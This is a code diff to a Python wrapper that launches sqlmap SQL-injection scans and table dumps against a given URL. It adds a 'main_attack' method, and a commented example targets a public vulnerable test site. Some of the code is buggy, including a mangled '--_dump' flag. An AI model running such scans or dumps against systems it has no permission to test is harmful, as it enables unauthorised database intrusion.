@@ -1,7 +1,9 @@
-import os
 import sys
+import os
 current_directory = os.getcwd()
 sys.path.append(current_directory)
+
+
 from threading import Thread
 from logger.logs import logger
 from Exceptions.exceptions import SQLJNGFatalError
@@ -14,27 +16,35 @@ from Exceptions.exceptions import SQLJNGOSError
 import subprocess
 from dataclasses import dataclass
 import threading
+import requests
+from logger.sqljlog import logger as sqljlog
+from Exceptions.sqljngwarnings import SQLJMapNotRunningInMacos
+import warnings
+import platform
 
 #Reference :https://stackoverflow.com/questions/32382793/inheritance-threading-thread-class-does-not-work
 
 @dataclass
 class SQLmap(Thread):
-    url : str
-    username : bool
-    password : bool
-    dump : bool
-    columns : bool
-    tables : bool
-    auto : bool
-    os = Operatingsystem()
-    platform = Platforms()
+    _url : str
+    _username : bool
+    _password : bool
+    _dump : bool
+    _columns : bool
+    _tables : bool
+    _auto : bool
+    _os = Operatingsystem()
+    _platform = Platforms()
 
     def _Check_SQlmap(self):
         try:
-            if self.os != self.platform.LINUX:
+            if self._os != self._platform.LINUX:
                 raise SQLJNGOSError
             
-            elif self.os == self.platform.LINUX:
+            elif self._os == self._platform.MAC.lower() or platform.system().lower() == "darwin":
+                warnings.warn("mac os cannot run sqlmap properly",SQLJMapNotRunningInMacos)
+            
+            elif self._os == self._platform.LINUX:
                 cmd = subprocess.check_output(["sqlmap","--version"])
                 msg = "sqlmap version:"
                 msg += str(cmd.decode('utf-8') if type(cmd) != int else "")
@@ -60,16 +70,16 @@ class SQLmap(Thread):
         if self._Check_SQlmap():
             try:
                 #Reference:https://stackoverflow.com/questions/89228/how-do-i-execute-a-program-or-call-a-system-command
-                cmd = subprocess.Popen(["sqlmap","-u",str(self.url)])
+                cmd = subprocess.Popen(["sqlmap","-u",str(self._url)])
                 cmd.wait()
                 print(cmd)
-                if self.tables:
-                    cmd = subprocess.Popen(["sqlmap","-u",str(self.url),"-T"])
+                if self._tables:
+                    cmd = subprocess.Popen(["sqlmap","-u",str(self._url),"-T"])
                     cmd.wait()
                     print(cmd)
                 
-                elif self.auto:
-                    cmd = subprocess.Popen(["sqlmap","-u",str(self.url),"--dump"])
+                elif self._auto:
+                    cmd = subprocess.Popen(["sqlmap","-u",str(self._url),"--_dump"])
                     cmd.wait()
                     print(cmd)
 
@@ -85,8 +95,8 @@ class SQLmap(Thread):
             logger.critical("Your system cannot execute sqlmap")
 
     def Dump_the_tables(self):
-        if self._Check_SQlmap() and self.dump is True:
-            cmd =subprocess.Popen(["sqlmap","-u",str(self.url)])
+        if self._Check_SQlmap() and self._dump is True:
+            cmd =subprocess.Popen(["sqlmap","-u",str(self._url)])
             cmd.wait()
 
     
@@ -100,11 +110,25 @@ class SQLmap(Thread):
             var.start()
             var.join()
 
-
-            
-            
-                
-
+    @property
+    def _normal_attack_checking_url_host(self):
+        self._Check_SQlmap()
+        try:
+            _response = requests.get(self._url)
+            assert _response.status_code == 200,"Host is not valid"
+            return True
+        
+        except AssertionError as ex:
+            sqljlog.error(ex)
+            return False
+        
+    def main_attack(self):
+        if self._normal_attack_checking_url_host:
+            self.execute_all()
+        
+    
+        
+    
                 
             
     
@@ -114,5 +138,5 @@ class SQLmap(Thread):
 
 
 # obj = SQLmap("http://testphp.vulnweb.com/artists.php?id=1",False,False,True,False,False,False)
-# obj.execute_all()
+# obj.main_attack()
 
